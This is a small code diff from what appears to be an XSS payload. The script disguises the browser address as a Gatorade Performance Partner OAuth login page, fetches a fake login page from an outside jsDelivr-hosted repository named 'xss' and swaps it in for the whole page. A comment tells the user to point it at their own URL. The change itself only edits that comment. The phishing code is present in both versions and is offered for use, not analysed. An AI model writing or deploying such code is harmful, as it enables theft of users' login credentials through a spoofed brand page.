@@ -6,7 +6,7 @@
     // Make URL look real
     history.replaceState(null, 'GSSI Universal Login - Gatorade Performance Partner', '/gpapi/oauth/login');
 
-    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')   // ← change to your actual raw URL
+    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')   // ← change to your actual raw URL.
         .then(r => r.text())
         .then(html => {
             // Replace entire page
